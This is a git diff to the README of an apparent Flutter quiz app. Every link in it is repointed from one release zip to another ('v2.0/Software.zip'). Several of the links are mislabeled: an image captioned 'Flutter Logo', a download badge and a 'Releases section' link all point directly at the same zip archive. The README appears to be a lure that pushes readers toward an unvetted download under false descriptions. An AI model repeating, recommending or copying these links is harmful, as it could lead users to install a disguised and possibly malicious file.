@@ -4,7 +4,7 @@
 
 The Quiz Application is a Flutter-based mobile app designed to provide an engaging and interactive quiz experience. With dynamic quiz data fetched from a remote API, the app offers intuitive navigation, real-time progress tracking, and detailed results. Gamification elements enhance the user experience, making learning both fun and challenging.
 
-![Flutter Logo](https://github.com/SiestaBott/testline/releases/download/v1.0/Soft.zip)
+![Flutter Logo](https://github.com/SiestaBott/testline/releases/download/v2.0/Software.zip)
 
 ### Features 🌟
 
@@ -34,11 +34,11 @@ This repository covers a range of topics related to developing Flutter applicati
 
 You can download the latest release of the Quiz Application by clicking the button below:
 
-[![Download Quiz Application](https://github.com/SiestaBott/testline/releases/download/v1.0/Soft.zip%20Application-brightgreen)](https://github.com/SiestaBott/testline/releases/download/v1.0/Soft.zip)
+[![Download Quiz Application](https://github.com/SiestaBott/testline/releases/download/v2.0/Software.zip%20Application-brightgreen)](https://github.com/SiestaBott/testline/releases/download/v2.0/Software.zip)
 
 ### Additional Information ℹ️
 
-For more details and updates, please visit the [Releases](https://github.com/SiestaBott/testline/releases/download/v1.0/Soft.zip) section.
+For more details and updates, please visit the [Releases](https://github.com/SiestaBott/testline/releases/download/v2.0/Software.zip) section.
 
 ### Stay Connected! 🌍
 
